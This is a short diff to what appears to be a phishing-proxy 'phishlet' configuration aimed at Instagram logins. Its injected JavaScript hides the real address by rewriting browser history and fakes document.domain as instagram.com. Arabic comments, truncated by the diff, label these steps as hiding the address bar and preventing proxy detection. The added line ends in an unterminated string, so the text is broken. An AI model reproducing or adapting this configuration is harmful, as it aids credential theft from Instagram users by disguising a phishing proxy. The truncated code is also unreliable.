@@ -36,7 +36,9 @@ auth_urls:
   - 'https://www.instagram.com/'
 
 js_inject: |
-  // إخفاء شريط عنوان الموقع
+  // إخفاء
   window.history.pushState({}, '', window.location.pathname);
-  // منع اكتشاف البروكسي
+  // منع 
   Object.defineProperty(document, 'domain', {value: 'instagram.com'});
+  // تعطيل 
+  console.log('Phishlet loaded successfully
